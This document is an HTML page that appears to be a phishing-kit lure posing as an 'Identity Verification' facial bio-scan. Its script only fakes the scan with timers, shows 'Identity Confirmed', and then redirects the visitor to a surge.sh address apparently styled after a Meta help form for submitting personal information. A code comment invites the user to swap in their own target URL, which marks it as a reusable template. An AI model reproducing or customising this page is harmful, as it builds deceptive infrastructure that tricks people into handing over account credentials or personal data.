<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Identity Verification</title>
  <style>
    :root {
      --primary-color: #00d2ff;
      --secondary-color: #3a7bd5;
      --success-color: #00ff88;
      --bg-dark: #0f172a;
    }

    body {
      margin: 0;
      padding: 0;
      background-color: var(--bg-dark);
      font-family: 'Inter', system-ui, -apple-system, sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      overflow: hidden;
    }

    .container {
      background: rgba(255, 255, 255, 0.03);
      backdrop-filter: blur(10px);
      padding: 50px 40px;
      border-radius: 24px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
      text-align: center;
      max-width: 420px;
      width: 90%;
      position: relative;
    }

    /* Modern Hexagon/Circle Scanner */
    .scanner-box {
      position: relative;
      width: 150px;
      height: 150px;
      margin: 0 auto 30px;
    }

    .scanner-circle {
      width: 100%;
      height: 100%;
      border: 4px solid transparent;
      border-top-color: var(--primary-color);
      border-bottom-color: var(--secondary-color);
      border-radius: 50%;
      animation: spin 1.5s cubic-bezier(0.5, 0, 0.5, 1) infinite;
    }

    .scanner-line {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 4px;
      background: var(--primary-color);
      box-shadow: 0 0 15px var(--primary-color);
      animation: scan 2s ease-in-out infinite;
      border-radius: 10px;
      opacity: 0.7;
    }

    .status-text {
      font-size: 1.1rem;
      letter-spacing: 1px;
      color: #94a3b8;
      margin-bottom: 20px;
      text-transform: uppercase;
    }

    /* Success State */
    .verified-icon {
      display: none;
      font-size: 70px;
      color: var(--success-color);
      text-shadow: 0 0 20px rgba(0, 255, 136, 0.4);
    }

    .btn-action {
      display: none;
      margin-top: 20px;
      padding: 14px 35px;
      background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
      color: white;
      text-decoration: none;
      border-radius: 12px;
      font-weight: 600;
      border: none;
      cursor: pointer;
      transition: transform 0.2s, box-shadow 0.2s;
      width: 100%;
    }

    .btn-action:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 20px -5px rgba(0, 210, 255, 0.4);
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    @keyframes scan {
      0%, 100% { top: 0%; }
      50% { top: 100%; }
    }

    .pulse {
      animation: pulse-animation 2s infinite;
    }

    @keyframes pulse-animation {
      0% { box-shadow: 0 0 0 0px rgba(0, 210, 255, 0.4); }
      100% { box-shadow: 0 0 0 20px rgba(0, 210, 255, 0); }
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="scanner-box" id="scannerBox">
      <div class="scanner-circle" id="spinner"></div>
      <div class="scanner-line" id="line"></div>
      <div class="verified-icon" id="checkIcon">✔</div>
    </div>

    <div class="status-text" id="statusLabel">Initializing Bio-Scan...</div>
    
    <button class="btn-action" id="nextBtn">Proceed to Dashboard</button>
  </div>

  <script>
    // Aapka Target URL yahan change karein
    const finalDestination = "https://submit-your-info-to-helpform2-meta.surge.sh/";

    window.addEventListener('load', () => {
      const statusLabel = document.getElementById('statusLabel');
      
      // Step 1: Scanning Simulation
      setTimeout(() => {
        statusLabel.innerText = "Analyzing Facial Features...";
      }, 1500);

      // Step 2: Completion
      setTimeout(() => {
        // Hide scanner elements
        document.getElementById('spinner').style.display = 'none';
        document.getElementById('line').style.display = 'none';
        
        // Show success elements
        document.getElementById('checkIcon').style.display = 'block';
        statusLabel.innerText = "Identity Confirmed";
        statusLabel.style.color = "#00ff88";
        
        const btn = document.getElementById('nextBtn');
        btn.style.display = 'block';
        btn.classList.add('pulse');
      }, 4000);
    });

    document.getElementById('nextBtn').addEventListener('click', () => {
      window.location.href = finalDestination;
    });
  </script>

</body>
</html>
